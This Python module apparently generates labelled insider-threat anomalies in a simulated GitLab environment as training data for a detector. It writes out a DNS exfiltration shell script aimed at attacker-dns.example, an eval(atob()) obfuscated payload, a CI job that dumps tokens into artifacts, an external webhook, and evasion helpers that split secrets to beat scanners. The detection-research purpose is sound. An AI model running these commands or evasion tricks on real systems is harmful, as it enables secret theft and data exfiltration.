"""
Инъекция РЕДКИХ размеченных аномалий — позитивный класс для будущего ML.

Каждая аномалия:
  * создаёт реальные артефакты в GitLab (коммит/MR/коммент/токен) — там, где безопасно;
  * пишет в журнал событий метки anomaly_type/severity (через events.tag);
  * имитирует то, что должен ловить детектор: утечки секретов, обход ревью,
    ослабление прав, разрушительные действия.

Изменения членства/протекции, которые могли бы реально сломать проект,
делаются «декларативно» — коммитом в policy-файл soc-infra (+ метка),
а не вызовом admin-API, чтобы не портить настоящую конфигурацию.
"""
import random
import logging
from datetime import datetime

import config
import events
from content import cover_docs
import simclock
from config import PROJECTS, USERS
from content import secrets_bank as sb

logger = logging.getLogger(__name__)

SECRET_TYPES = {"secret_in_commit", "secret_in_ci", "secret_in_mr_comment",
                "secret_exfil_vault", "hardcoded_token", "pipeline_token_leak",
                "artifact_secret_exposure", "data_exfiltration"}

SEVERITY = {
    "secret_in_commit": "critical", "secret_in_ci": "critical",
    "secret_exfil_vault": "critical", "hardcoded_token": "high",
    "secret_in_mr_comment": "high",
    "self_approval_merge": "high", "merge_without_review": "medium",
    "direct_push_protected": "high", "weaken_protection": "high",
    "grant_secret_access": "high", "rogue_token": "high",
    "mass_deletion": "high",
    "pipeline_token_leak": "critical", "commit_to_secrets_repo": "high",
    "disable_pipeline_security": "high", "artifact_secret_exposure": "high",
    "data_exfiltration": "critical",
}

NORMAL_REPOS = ["detection-rules", "normalization-rules", "playbooks", "soc-infra"]

import uuid

# Семейства аномалий для пер-семейной оценки (десятки примеров на семейство).
FAMILY = {
    "secret_in_commit": "secret_leak", "secret_in_ci": "secret_leak",
    "secret_in_mr_comment": "secret_leak", "hardcoded_token": "secret_leak",
    "commit_to_secrets_repo": "secret_leak", "artifact_secret_exposure": "secret_leak",
    "secret_exfil_vault": "exfil", "data_exfiltration": "exfil",
    "pipeline_token_leak": "pipeline", "disable_pipeline_security": "pipeline",
    "grant_secret_access": "access_abuse", "rogue_token": "access_abuse",
    "weaken_protection": "access_abuse", "direct_push_protected": "access_abuse",
    "self_approval_merge": "process", "merge_without_review": "process",
    "mass_deletion": "destructive",
    "recon_enumeration": "recon",
}




class AnomalyActivity:
    def __init__(self, agents: dict, state=None):
        self.agents = agents
        self.state = state

    # ------------------------------------------------------------------
    def _actor(self):
        # «носитель» аномалии — любой инженер/ML, иногда lead
        pool = [u for u in config.engineer_usernames() if u in self.agents]
        if random.random() < 0.15 and config.lead_username() in self.agents:
            pool.append(config.lead_username())
        out = self.state.who_is_out_today() if self.state else None
        pool = [u for u in pool if u != out] or pool or list(self.agents)
        return self.agents[random.choice(pool)]

    def _repo(self, name=None):
        # Разрешение id — ТОЛЬКО через config.repo_id(): статическая карта
        # PROJECTS хранит id первого инстанса GitLab и после пересоздания
        # репозиториев устаревает (см. докстринг config.repo_id).
        if name:
            return name, config.repo_id(name)
        pool = [n for n in config.WORK_REPOS if n != "soc-secrets"] or NORMAL_REPOS
        n = random.choice(pool)
        return n, config.repo_id(n)

    def _pick(self):
        cfg = config.ANOMALIES
        mult = getattr(config, "SECRET_RATE_MULT", 1.0)
        keys, weights = [], []
        for k, v in cfg.items():
            if not v.get("enabled"):
                continue
            w = v.get("weight", 1.0)
            if k in SECRET_TYPES:
                w *= mult
            if w > 0:
                keys.append(k); weights.append(w)
        if not keys:
            return None
        return random.choices(keys, weights=weights, k=1)[0]

    # ------------------------------------------------------------------
    def run(self, anom_type=None, actor=None, campaign=None):
        """campaign — опц. словарь контекста шага кампании:
        {campaign_id, step_idx, technique_id, tactic, evasion_profile}."""
        anom_type = anom_type or self._pick()
        if not anom_type:
            return False
        fn = getattr(self, "_a_" + anom_type, None)
        if not fn:
            return False
        actor = actor or self._actor()
        self.evasion = (campaign or {}).get("evasion_profile", "noisy")
        ok = False
        eid = "ep-" + uuid.uuid4().hex[:12]
        tagkw = dict(anomaly_type=anom_type, severity=SEVERITY.get(anom_type, "medium"),
                     episode_id=eid, family=FAMILY.get(anom_type, "other"))
        if campaign:
            tagkw.update({k: v for k, v in campaign.items() if v is not None})
        with events.tag(**tagkw):
            try:
                ok = fn(actor)
            except Exception as e:
                logger.exception(f"anomaly {anom_type} failed: {e}")
                ok = False
            events.emit("anomaly", actor=actor.username, role=actor.role,
                        message=f"injected anomaly: {anom_type}",
                        extra={"anomaly_subtype": anom_type, "executed": bool(ok), "meta": True})
            try:
                import telegram, report
                if config.TELEGRAM.get("send_anomalies"):
                    telegram.send(report.build_anomaly_alert(anom_type, actor.username,
                                  SEVERITY.get(anom_type, "")),
                                  silent=True,
                                  min_interval=config.TELEGRAM.get("anomaly_min_gap", 20))
            except Exception:
                pass
        logger.warning(f"[ANOMALY] {anom_type} by {actor.username} -> {'ok' if ok else 'fail'} "
                       f"@ {simclock.stamp()}")
        return ok

    # --- уклонение (evasion) ----------------------------------------
    BENIGN_PATHS = ["docs/notes.md", "src/helpers.py", "tests/fixtures.json",
                    "docs/dev_setup.md", "lib/util.py"]

    def _ev_path(self, default):
        """stealthy/adaptive: прячем секрет под benign-путь (filename-сигнатура молчит)."""
        if getattr(self, "evasion", "noisy") in ("stealthy", "adaptive"):
            return random.choice(self.BENIGN_PATHS)
        return default

    def _ev_content(self, content):
        """stealthy/adaptive: дробим длинные токены, чтобы secret-regex/энтропия не сработали
        (имитация обфускации/дробления секрета злоумышленником)."""
        if getattr(self, "evasion", "noisy") in ("stealthy", "adaptive"):
            import re as _re
            return _re.sub(r"([A-Za-z0-9_\-]{12})", r"\1 \\\n", content)
        return content

    # === РАЗВЕДКА =======================================================
    def _a_recon_enumeration(self, actor):
        """Перебор репозиториев и листинг секрет-путей (Reconnaissance).

        НОРМАЛИЗОВАНО: раньше эмитилось действие `repo_enum`, которого у
        обычных сотрудников не бывает — правило `{"action": "repo_enum"}`
        читало метку. Теперь это серия обычных `api_read`, как в аудит-логе
        GitLab. Отличить разведку от обычного просмотра можно только по
        частоте и объёму выдачи — этим занимается детектор.
        """
        targets = random.sample(
            ["detection-rules", "soc-secrets", "soc-infra", "playbooks", "normalization-rules"], k=5)
        with events.tag(is_decisive=True, detail="enumerated repos and secret paths"):
            for i, tgt in enumerate(targets):
                events.emit("api_read", actor=actor.username, role=actor.role,
                            project=tgt, message="GET /projects tree listing",
                            extra={"api_path": "/projects" if i == 0 else "/repository/tree",
                                   "items_returned": random.randint(40, 120),
                                   "is_decisive": i == 0})
        return True

    # === СЕКРЕТЫ =======================================================
    def _a_secret_in_commit(self, actor):
        name, pid = self._repo(random.choice(["detection-rules", "normalization-rules", "soc-infra"]))
        stype, content = sb.secret_env_file()
        branch = actor.unique_branch("chore/config")
        if not actor.create_branch(pid, branch):
            return False
        actor.think(2)
        path = self._ev_path(random.choice(["config/prod.env", "deploy/.env",
                              "config/settings_prod.py", "infra/secrets.env"]))
        with events.tag(is_decisive=True, secret_type=stype, repo=name):
            ok = actor.push_file(pid, path, self._ev_content(content),
                                 "chore: add production config", branch)
        if ok and random.random() < 0.5:
            self.agents["alex.petrov"]
            iid = actor.create_mr(pid, branch, "chore: production config", "Конфиг для прод.",
                                  USERS["alex.petrov"]["id"])
            if iid:
                actor.approve_mr(pid, iid)  # сам аппрувит — двойная аномалия
                actor.merge_mr(pid, iid)
        return ok

    def _a_secret_in_ci(self, actor):
        name, pid = self._repo()
        secret = sb.random_secret()
        ci = ("stages:\n  - deploy\n\n"
              "deploy_prod:\n  stage: deploy\n  script:\n"
              f"    - echo \"Deploying with {secret['lines'][0]}\"\n"
              f"    - export {secret['lines'][0]}\n"
              "    - ./deploy.sh --prod\n")
        branch = actor.unique_branch("ci/deploy")
        if not actor.create_branch(pid, branch):
            return False
        actor.think(2)
        with events.tag(is_decisive=True, secret_type=secret["type"], repo=name):
            return actor.push_file(pid, self._ev_path(".gitlab-ci.yml"), self._ev_content(ci),
                                   "ci: add prod deploy job", branch)

    def _a_secret_in_mr_comment(self, actor):
        name, pid = self._repo()
        branch = actor.unique_branch("fix/typo")
        if not actor.create_branch(pid, branch):
            return False
        _p, _c, _m = cover_docs.cover_doc(actor.username, branch)
        actor.push_file(pid, _p, _c, _m, branch)
        iid = actor.create_mr(pid, branch, _m, "Мелкая правка по документации.",
                              USERS["alex.petrov"]["id"])
        if not iid:
            return False
        secret = sb.random_secret()
        body = ("Чтобы проверить деплой, вот креды от прод-стейджа, не теряй:\n\n```\n"
                + "\n".join(secret["lines"]) + "\n```")
        with events.tag(is_decisive=True, secret_type=secret["type"], repo=name):
            return actor.comment_mr(pid, iid, body)

    def _a_secret_exfil_vault(self, actor):
        name, pid = self._repo(random.choice(["detection-rules", "playbooks"]))
        # «бэкап» секретов из vault, выложенный в обычный репозиторий
        lines = []
        for _ in range(random.randint(2, 4)):
            lines += sb.random_secret()["lines"]
        content = "# backup of prod secrets (exported from vault)\n" + "\n".join(lines) + "\n"
        branch = actor.unique_branch("backup/prod")
        if not actor.create_branch(pid, branch):
            return False
        actor.think(2)
        with events.tag(is_decisive=True, secret_type="vault_export", repo=name):
            return actor.push_file(pid, self._ev_path("backup/prod_secrets_backup.env"), self._ev_content(content),
                                   "backup: prod secrets snapshot", branch)

    def _a_hardcoded_token(self, actor):
        name, pid = self._repo(random.choice(["normalization-rules", "soc-infra"]))
        secret = sb.random_secret()
        code = ("import requests\n\n"
                f"# TODO: move to vault\n{secret['lines'][0]}\n"
                "def push_metrics(payload):\n"
                "    headers = {'Authorization': 'Bearer ' + " +
                f"'{secret['lines'][0].split('=')[-1][:20]}'" + "}\n"
                "    return requests.post('https://metrics.soc.local/api', json=payload, headers=headers)\n")
        branch = actor.unique_branch("feat/metrics")
        if not actor.create_branch(pid, branch):
            return False
        actor.think(2)
        with events.tag(is_decisive=True, secret_type=secret["type"], repo=name):
            return actor.push_file(pid, self._ev_path("scripts/push_metrics.py"), self._ev_content(code),
                                   "feat: metrics push helper", branch)

    # === ПРАВА / ОБХОД РЕВЬЮ ===========================================
    def _a_self_approval_merge(self, actor):
        name, pid = self._repo()
        branch = actor.unique_branch("feat/self")
        if not actor.create_branch(pid, branch):
            return False
        _p, _c, _m = cover_docs.cover_changelog(random.choice(["parser", "collector", "normalizer"]))
        actor.push_file(pid, _p, _c, _m, branch)
        iid = actor.create_mr(pid, branch, _m,
                              "Мелочь, ревью не жду — вливаю сам, чтобы не блокировать релиз.",
                              actor.user_id)
        if not iid:
            return False
        with events.tag(is_decisive=True):
            actor.approve_mr(pid, iid)
            return actor.merge_mr(pid, iid)

    def _a_merge_without_review(self, actor):
        name, pid = self._repo()
        branch = actor.unique_branch("feat/fast")
        if not actor.create_branch(pid, branch):
            return False
        _p, _c, _m = cover_docs.cover_hotfix(random.choice(["collector", "shipper", "enricher"]))
        actor.push_file(pid, _p, _c, _m, branch)
        iid = actor.create_mr(pid, branch, _m,
                              "Прод лежит на ретраях, вливаю без ожидания ревью.",
                              USERS["alex.petrov"]["id"])
        if not iid:
            return False
        with events.tag(is_decisive=True):
            return actor.merge_mr(pid, iid)

    def _a_direct_push_protected(self, actor):
        name, pid = self._repo()
        _p, _c, _m = cover_docs.cover_hotfix(random.choice(["collector", "gateway", "indexer"]))
        with events.tag(is_decisive=True, repo=name, target="main"):
            ok = actor.push_file(pid, _p, _c, _m, "main")
        if not ok:
            # ветка main защищена — фиксируем сам факт попытки
            events.emit("anomaly_attempt", actor=actor.username, role=actor.role,
                        project=name, target="main",
                        message="attempted direct push to protected main (blocked)")
        return ok

    def _a_weaken_protection(self, actor):
        pid = config.repo_id("soc-infra")
        policy = ("# branch protection policy\n"
                  "main:\n  protected: false   # CHANGED: protection removed\n"
                  "  allow_force_push: true\n  required_approvals: 0\n")
        branch = actor.unique_branch("chore/branch-policy")
        if not actor.create_branch(pid, branch):
            return False
        with events.tag(is_decisive=True, target="main", repo="soc-infra"):
            return actor.push_file(pid, "policy/branch-protection.yml", policy,
                                   "chore: update branch protection policy", branch)

    def _a_grant_secret_access(self, actor):
        pid = config.repo_id("soc-infra")
        grantee = random.choice(["maria.ivanova", "dmitry.kozlov", "anna.smirnova"])
        members = ("# soc-secrets access control\n"
                   "owners:\n  - alex.petrov\n  - soc-bot\n"
                   f"developers:\n  - {grantee}   # ADDED: granted access to soc-secrets\n")
        branch = actor.unique_branch("chore/access")
        if not actor.create_branch(pid, branch):
            return False
        with events.tag(is_decisive=True, repo="soc-infra", grantee=grantee, target="soc-secrets"):
            return actor.push_file(pid, "policy/soc-secrets-members.yml", members,
                                   "chore: update soc-secrets access list", branch)

    def _a_rogue_token(self, actor):
        """Лишний токен на чужого пользователя.

        Действие `token_create` теперь есть и у обычной команды (ротация своих
        read-токенов). Наблюдаемое отличие: scope=api, бессрочный, выписан
        НЕ СЕБЕ — на этом и должно строиться правило.
        """
        target = random.choice(["maria.ivanova", "dmitry.kozlov", "anna.smirnova"])
        ok = actor.gl.create_named_token(USERS[target]["id"],
                                         name="ci-temp-" + datetime.now().strftime("%H%M%S"),
                                         scopes=["api"])
        events.emit("token_create", actor=actor.username, role=actor.role,
                    target=target, message="created additional API token",
                    extra={"token_scope": "api", "for_user": target, "for_self": False,
                           "expires_days": None, "is_decisive": True})
        return ok

    # === РАЗРУШИТЕЛЬНЫЕ ================================================
    def _a_mass_deletion(self, actor):
        """Массовое удаление файлов.

        НОРМАЛИЗОВАНО: раньше эмитилось одно агрегированное событие
        `mass_delete`, которого нет в обычной работе. Теперь — N обычных
        `file_delete`, ровно как их порождает commit_changes() у нормального
        сотрудника. «Массовость» детектор обязан вывести сам, из всплеска
        удалений в окне (см. detector.Enricher / правило mass-file-delete).
        """
        name, pid = self._repo(random.choice(["detection-rules", "normalization-rules"]))
        files = [f for f in actor.gl.list_files(pid, "rules") if f.endswith(".yml")]
        if len(files) < 5:
            files = [f for f in actor.gl.list_files(pid) if f.endswith((".yml", ".md", ".json"))]
        victims = random.sample(files, k=min(len(files), random.randint(5, 12))) if files else []
        if not victims:
            return False
        branch = actor.unique_branch("chore/cleanup")
        if not actor.create_branch(pid, branch):
            return False
        actions = [{"action": "delete", "file_path": f} for f in victims]
        ok = actor.gl.create_commit(pid, branch, "chore: cleanup old files", actions, actor.token)
        for i, f in enumerate(victims):
            events.emit("file_delete", actor=actor.username, role=actor.role, project=name,
                        branch=branch, path=f, message="chore: cleanup old files",
                        extra={"is_decisive": i == len(victims) - 1})
        return ok

    # === ПАЙПЛАЙНЫ / ТОКЕНЫ ============================================
    def _a_pipeline_token_leak(self, actor):
        """Кривой пайплайн светит токены в лог джобы и кладёт в артефакт."""
        name, pid = self._repo()
        ci = ("stages:\n  - debug\n\n"
              "debug_env:\n  stage: debug\n  script:\n"
              "    - echo \"job token = $CI_JOB_TOKEN\"\n"
              "    - printenv | grep -iE 'token|secret|key'\n"
              "    - echo \"$DEPLOY_TOKEN\" > deploy_token.txt\n"
              "  artifacts:\n    paths:\n      - deploy_token.txt\n    expire_in: never\n")
        branch = actor.unique_branch("ci/debug")
        if not actor.create_branch(pid, branch):
            return False
        actor.think(2)
        with events.tag(is_decisive=True, secret_type="ci_token", repo=name,
                        detail="pipeline prints tokens to job log and saves to artifact"):
            return actor.push_file(pid, ".gitlab-ci.yml", ci,
                                   "ci: add debug job (prints env)", branch)

    def _a_disable_pipeline_security(self, actor):
        """Отключение SAST / secret-detection в пайплайне."""
        name, pid = self._repo()
        ci = ("include:\n  - template: Security/Secret-Detection.gitlab-ci.yml\n\n"
              "variables:\n"
              "  SECRET_DETECTION_DISABLED: \"true\"\n"
              "  SAST_DISABLED: \"true\"\n"
              "  DEPENDENCY_SCANNING_DISABLED: \"true\"\n")
        branch = actor.unique_branch("ci/speedup")
        if not actor.create_branch(pid, branch):
            return False
        actor.think(2)
        with events.tag(is_decisive=True, repo=name, detail="disabled SAST/secret-detection in CI"):
            return actor.push_file(pid, ".gitlab-ci.yml", ci,
                                   "ci: speed up pipeline (disable scanners)", branch)

    def _a_artifact_secret_exposure(self, actor):
        """Сборка кладёт креды в публичный артефакт."""
        name, pid = self._repo()
        secret = sb.random_secret()
        script = ("#!/bin/sh\n# build artifacts\nmkdir -p dist\n"
                  f"cat > dist/config.json <<'EOF'\n{{\n  \"{secret['lines'][0]}\"\n}}\nEOF\n"
                  "echo 'artifact ready'\n")
        branch = actor.unique_branch("build/release")
        if not actor.create_branch(pid, branch):
            return False
        actor.think(2)
        with events.tag(is_decisive=True, secret_type=secret["type"], repo=name,
                        detail="credentials written into build artifact"):
            return actor.push_file(pid, "build/make_release.sh", script,
                                   "build: produce release artifact", branch)

    def _a_commit_to_secrets_repo(self, actor):
        """Прямой коммит секрета в защищённый vault-репозиторий soc-secrets."""
        pid = config.repo_id("soc-secrets")
        stype, content = sb.secret_env_file()
        branch = actor.unique_branch("add/secret")
        if not actor.create_branch(pid, branch):
            # ветку нельзя — пробуем напрямую в main
            with events.tag(is_decisive=True, secret_type=stype, repo="soc-secrets", target="main",
                            detail="direct write of new secret to vault repo"):
                return actor.push_file(pid, f"vault/{branch[-5:]}.env", content,
                                       "add: new service credentials", "main")
        actor.think(2)
        with events.tag(is_decisive=True, secret_type=stype, repo="soc-secrets",
                        detail="engineer added secret to vault repo"):
            return actor.push_file(pid, f"vault/{branch[-5:]}.env", content,
                                   "add: new service credentials", branch)

    def _a_data_exfiltration(self, actor):
        """Выгрузка большого зашифрованного на вид архива (эксфильтрация данных)."""
        name, pid = self._repo()
        blob = "\n".join(sb.base64_blob()["lines"][0] for _ in range(40))
        content = "# nightly export\n" + blob + "\n"
        branch = actor.unique_branch("export/data")
        if not actor.create_branch(pid, branch):
            return False
        actor.think(2)
        with events.tag(is_decisive=True, repo=name, secret_type="data_blob",
                        detail="large encoded archive committed (possible exfiltration)"):
            return actor.push_file(pid, self._ev_path("export/dump_b64.txt"), self._ev_content(content),
                                   "chore: nightly data export", branch)

    # === ПРИМИТИВЫ НА НОРМАЛИЗОВАННЫХ ДЕЙСТВИЯХ ========================
    # Раньше каждый шаг эмитил СВОЁ говорящее действие (steal_oauth,
    # perm_discovery, webhook_c2 ...), которого у обычных сотрудников не
    # бывает, и правило вида {"action": "steal_oauth"} читало метку, а не
    # обнаруживало атаку.
    #
    # Теперь все шаги описаны действиями из taxonomy.OBSERVABLE — теми же,
    # что порождает нормальная работа команды. Атака отличается только
    # НАБЛЮДАЕМЫМИ АТРИБУТАМИ: scope токена, внешний хост вебхука, уровень
    # доступа, ночное расписание, энтропия содержимого, объём выдачи API.
    # Детектор обязан вывести технику из атрибутов.

    def _a_scheduled_ci_job(self, actor):
        """Ночное расписание пайплайна под контролем атакующего.
        T1053 Scheduled Task/Job. Норма тоже заводит расписания (ночные сборки),
        отличие — расписание на защищённой ветке + ручной прогон следом."""
        name, _ = self._repo()
        with events.tag(is_decisive=True, repo=name,
                        detail="attacker-controlled scheduled pipeline added"):
            events.emit("schedule_create", actor=actor.username, role=actor.role,
                        project=name, branch="main",
                        message="ci: add nightly scheduled pipeline",
                        extra={"cron": "0 3 * * *", "is_night_cron": True,
                               "protected_branch": True, "target_env": "production"})
            events.emit("pipeline_run", actor=actor.username, role=actor.role,
                        project=name, branch="main", message="ci: run pipeline",
                        extra={"manual_trigger": True, "target_env": "production"})
        return True

    def _a_container_creds(self, actor):
        """Учётные данные реестра в манифесте k8s. T1552.007.
        Обычный push — распознаётся по содержимому, а не по имени действия."""
        name, pid = self._repo()
        secret = "dockerconfigjson: " + "".join(
            random.choice("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
            for _ in range(220)) + "=="
        content = ("apiVersion: v1\nkind: Secret\ntype: kubernetes.io/dockerconfigjson\n"
                   "metadata:\n  name: prod-registry\ndata:\n  ." + secret + "\n")
        branch = actor.unique_branch("deploy/registry")
        if not actor.create_branch(pid, branch):
            return False
        with events.tag(is_decisive=True, repo=name, secret_type="container_creds",
                        detail="registry/cluster credentials in a k8s manifest"):
            return actor.push_file(pid, self._ev_path("deploy/k8s/registry-secret.yaml"),
                                   self._ev_content(content),
                                   "deploy: add imagePullSecret for prod registry", branch)

    def _a_inhibit_recovery(self, actor):
        """Удаление резервных веток и тегов. T1490 Inhibit System Recovery.
        Нормализовано в серию branch_delete — «массовость» выводит детектор."""
        name, _ = self._repo()
        refs = [f"backup/{k}" for k in ("weekly", "daily", "pre-release", "archive-2025")]
        with events.tag(is_decisive=True, repo=name,
                        detail="backup branches and tags deleted"):
            for i, ref in enumerate(refs):
                events.emit("branch_delete", actor=actor.username, role=actor.role,
                            project=name, branch=ref, message="chore: prune old backup refs",
                            extra={"protected_branch": True, "is_decisive": i == len(refs) - 1})
        return True

    def _a_add_deploy_key(self, actor):
        """Внешний SSH deploy-ключ НА ЗАПИСЬ. T1021.004.
        Норма тоже добавляет deploy-ключи, но read-only и на внутренний хост."""
        name, _ = self._repo()
        with events.tag(is_decisive=True, repo=name, secret_type="ssh_key",
                        detail="external SSH deploy key added to repo"):
            events.emit("deploy_key_add", actor=actor.username, role=actor.role,
                        project=name, message="ci: add deploy key for build runner",
                        extra={"key_write_access": True, "external_host": True,
                               "hook_host": "build.ext-runner.io"})
        return True

    def _a_code_search(self, actor):
        """Поиск секретов по коду. T1593.003.
        Нормализовано в api_read /search — обычный поиск делают все,
        отличие в длине запроса под secret-паттерны и объёме выдачи."""
        name, _ = self._repo()
        with events.tag(is_decisive=True, repo=name, detail="searched code for secret patterns"):
            for q in ("password=", "BEGIN RSA PRIVATE KEY", "glpat-", "AKIA"):
                events.emit("api_read", actor=actor.username, role=actor.role,
                            project=name, message="GET /search across repos",
                            extra={"api_path": "/search", "query_len": len(q),
                                   "items_returned": random.randint(30, 90),
                                   "is_decisive": q == "glpat-"})
        return True

    def _a_dep_poison(self, actor):
        """Подмена зависимости (typo-squat). T1195.001.
        Обычный push в requirements.txt — распознаётся по новой закреплённой
        зависимости, а не по имени действия."""
        name, pid = self._repo()
        content = ("requests>=2.31.0\nurllib3>=2.0.0\nFlask>=3.0.0\n"
                   "internal-utils==9.9.9\n")
        branch = actor.unique_branch("chore/deps")
        if not actor.create_branch(pid, branch):
            return False
        with events.tag(is_decisive=True, repo=name, detail="malicious dependency pinned"):
            return actor.push_file(pid, "requirements.txt", content,
                                   "chore: bump internal-utils to 9.9.9", branch,
                                   extra={"dependency_added": True,
                                          "dependency_pinned_new": True})

    def _a_deploy_tool_abuse(self, actor):
        """Средство развёртывания запускает задачу атакующего. T1072.
        Нормализовано в pipeline_run: норма тоже гоняет пайплайны, отличие —
        ручной прогон в production в нерабочее время."""
        name, _ = self._repo()
        with events.tag(is_decisive=True, repo=name,
                        detail="deployment tool used to run attacker task"):
            events.emit("pipeline_run", actor=actor.username, role=actor.role,
                        project=name, branch="main",
                        message="deploy: run one-off provisioning play",
                        extra={"manual_trigger": True, "target_env": "production",
                               "protected_branch": True})
        return True

    def _a_cloud_account_create(self, actor):
        """Служебный облачный аккаунт с широкими правами. T1136.003.
        Нормализовано в member_update с максимальным access_level."""
        name, _ = self._repo()
        with events.tag(is_decisive=True, repo=name,
                        detail="extra cloud service account provisioned"):
            events.emit("member_update", actor=actor.username, role=actor.role,
                        project=name, message="iam: add ci-runner service account",
                        extra={"access_level": 40, "self_grant": False,
                               "target_user": "svc-ci-runner", "new_member": True})
        return True

    def _a_elevate_privs(self, actor):
        """Повышение прав себе. T1548.
        Норма меняет права участникам (20/30), отличие — Owner и себе."""
        name, _ = self._repo()
        with events.tag(is_decisive=True, repo=name, detail="elevation control bypassed"):
            events.emit("member_update", actor=actor.username, role=actor.role,
                        project=name, message="access: grant maintainer to runner",
                        extra={"access_level": 50, "self_grant": True,
                               "target_user": actor.username})
        return True

    def _a_history_rewrite(self, actor):
        """Переписывание истории, чтобы скрыть следы. T1070.004.
        Нормализовано в force_push: норма тоже делает force-push после rebase,
        отличие — защищённая ветка и много потерянных коммитов."""
        name, _ = self._repo()
        with events.tag(is_decisive=True, repo=name,
                        detail="history rewritten to remove indicators"):
            events.emit("force_push", actor=actor.username, role=actor.role,
                        project=name, branch="main",
                        message="force-push rewriting history",
                        extra={"protected_branch": True,
                               "commits_dropped": random.randint(9, 24)})
        return True

    def _a_obfuscated_payload(self, actor):
        """Обфусцированный код в коммите. T1027.
        Обычный push .js — распознаётся по энтропии и структуре содержимого."""
        name, pid = self._repo()
        blob = "".join(random.choice(
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/")
            for _ in range(1400))
        content = "eval(atob('" + blob + "'));\n"
        branch = actor.unique_branch("chore/minify")
        if not actor.create_branch(pid, branch):
            return False
        with events.tag(is_decisive=True, repo=name, detail="obfuscated payload committed"):
            return actor.push_file(pid, self._ev_path("scripts/util.min.js"),
                                   self._ev_content(content), "chore: minify helper", branch)

    def _a_steal_oauth(self, actor):
        """Съём OAuth-токенов приложения. T1528.
        Нормализовано в api_read /oauth/tokens — обычный GET к API."""
        name, _ = self._repo()
        with events.tag(is_decisive=True, repo=name,
                        detail="application OAuth token captured"):
            events.emit("api_read", actor=actor.username, role=actor.role,
                        project=name, message="GET /oauth/tokens",
                        extra={"api_path": "/oauth/tokens",
                               "items_returned": random.randint(8, 30)})
        return True

    def _a_perm_discovery(self, actor):
        """Перечисление прав и групп. T1069.
        Нормализовано в api_read /members по многим проектам подряд.

        Число репозиториев — 5..8, а не 4. Правило `perm-discovery` требует
        `burst_api_read_15m >= 5` И `distinct_projects_1h >= 4`; шаг же выдавал
        РОВНО 4 запроса, то есть первое условие не выполнялось никогда.
        Техника T1069 числилась покрытой правилом, которое физически не могло
        сработать ни на одном прогоне (tests/test_rule_coverage.py).
        """
        n = random.randint(5, 8)
        with events.tag(is_decisive=True, detail="permission groups enumerated"):
            for i, proj in enumerate(random.sample(list(config.WORK_REPOS),
                                                   k=min(n, len(config.WORK_REPOS)))):
                events.emit("api_read", actor=actor.username, role=actor.role,
                            project=proj, message="GET /members",
                            extra={"api_path": "/members",
                                   "items_returned": random.randint(10, 40),
                                   "is_decisive": i == 0})
        return True

    def _a_automated_collection(self, actor):
        """Автоматический сбор данных из репозиториев. T1119.
        Нормализовано в серию api_read /repository/archive большого объёма."""
        with events.tag(is_decisive=True, detail="automated harvester over repositories"):
            for i, proj in enumerate(random.sample(list(config.WORK_REPOS), k=min(5, len(config.WORK_REPOS)))):
                events.emit("api_read", actor=actor.username, role=actor.role,
                            project=proj, message="GET /repository/archive",
                            extra={"api_path": "/repository/archive",
                                   "items_returned": random.randint(60, 200),
                                   "bytes": random.randint(2_000_000, 9_000_000),
                                   "is_decisive": i == 0})
        return True

    def _a_webhook_c2(self, actor):
        """Управление через внешний веб-сервис. T1102.
        Норма тоже заводит вебхуки, отличие — хост вне периметра."""
        name, _ = self._repo()
        with events.tag(is_decisive=True, repo=name,
                        detail="outbound webhook to external service"):
            events.emit("hook_create", actor=actor.username, role=actor.role,
                        project=name, message="add webhook to external host",
                        extra={"hook_host": "hook.attacker-cdn.example",
                               "external_host": True, "on_push": True})
        return True

    def _a_exfil_altproto(self, actor):
        """Вынос по альтернативному протоколу. T1048.
        Обычный push CI-скрипта — распознаётся по содержимому (внешний хост,
        scp/dns) и по объёму последующей выгрузки."""
        name, pid = self._repo()
        content = ("#!/bin/sh\n"
                   "tar czf - artifacts/ | base64 -w0 | "
                   "split -b 200 - /tmp/chunk_\n"
                   "for f in /tmp/chunk_*; do "
                   "dig +short $(cat $f).exfil.attacker-dns.example; done\n")
        branch = actor.unique_branch("ci/sync")
        if not actor.create_branch(pid, branch):
            return False
        with events.tag(is_decisive=True, repo=name,
                        detail="data pushed over scp/dns to external host"):
            return actor.push_file(pid, self._ev_path("ci/upload.sh"),
                                   self._ev_content(content),
                                   "ci: sync artifacts to remote", branch)

    # === ПРИМИТИВЫ, ДОБАВЛЕННЫЕ ПО РЕЗУЛЬТАТАМ ТРАССИРУЕМОСТИ ============
    # tests/test_rule_coverage.py показал, что четыре правила не срабатывали
    # НИ РАЗУ: техника у них была описана, а шага атаки, который бы её
    # исполнял, в кампаниях не существовало. Правило без исполняемого шага
    # создаёт видимость покрытия ATT&CK и не проверяется ничем.

    def _a_mailbox_forward(self, actor):
        """Правило пересылки почты на внешний адрес.
        MITRE T1114.003 Email Forwarding Rule (Collection).

        В контуре разработки это делается через конфигурацию уведомлений
        репозитория: обычный push, распознаётся по пути и содержимому.
        """
        name, pid = self._repo()
        content = ("# notification routing\n"
                   "mail:\n"
                   "  smtp_host: smtp.soc.local\n"
                   "  forward_rules:\n"
                   "    - match: \"*\"\n"
                   "      inbox: security-alerts@soc.local\n"
                   "      forward_to: archive.backup@mail-relay.example\n"
                   "      keep_copy: false\n")
        branch = actor.unique_branch("chore/config")
        if not actor.create_branch(pid, branch):
            return False
        with events.tag(is_decisive=True, repo=name,
                        detail="mail forwarding rule to an external address"):
            return actor.push_file(pid, "config/mail-forward.yml", content,
                                   "chore: route alert mail to archive", branch)

    def _a_supply_chain_secret(self, actor):
        """Учётные данные приватного индекса пакетов в манифесте зависимостей.
        MITRE T1195.002 Supply Chain Compromise (Initial Access).

        Отличается от dep_poison: там подменяется зависимость, здесь в манифест
        попадает секрет доступа к репозиторию пакетов.
        """
        name, pid = self._repo()
        secret = sb.random_secret()
        content = ("--index-url https://ci-bot:" + secret["lines"][0].split("=")[-1]
                   + "@pkgs.internal.example/simple\n"
                   "requests>=2.31.0\nurllib3>=2.0.0\ninternal-utils==2.4.1\n")
        branch = actor.unique_branch("chore/deps")
        if not actor.create_branch(pid, branch):
            return False
        with events.tag(is_decisive=True, repo=name, secret_type=secret["type"],
                        detail="private index credentials committed in the manifest"):
            return actor.push_file(pid, "requirements.txt",
                                   self._ev_content(content),
                                   "chore: pin internal package index", branch)
